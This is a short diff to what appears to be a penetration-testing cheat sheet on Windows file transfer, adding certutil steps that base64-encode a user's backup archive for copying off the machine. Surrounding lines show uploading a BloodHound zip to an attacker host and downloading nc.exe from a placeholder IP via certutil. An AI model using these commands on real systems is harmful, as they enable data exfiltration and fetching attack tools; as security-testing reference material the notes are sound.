@@ -103,6 +103,10 @@ start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/up
 
 ```
 #available in all Windows versions
+certutil.exe -encode C:\Users\Alfred\Downloads\backups\backup.zip c:\\windows\\temp\backup.b64
+type c:\windows\temp #then copy and paste in your machine
+vi backup.base64
+base64 -d backup.base64 > backup.zip
 #the Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.
 certutil.exe -verifyctl -split -f http://<IP>/nc.exe
 ```
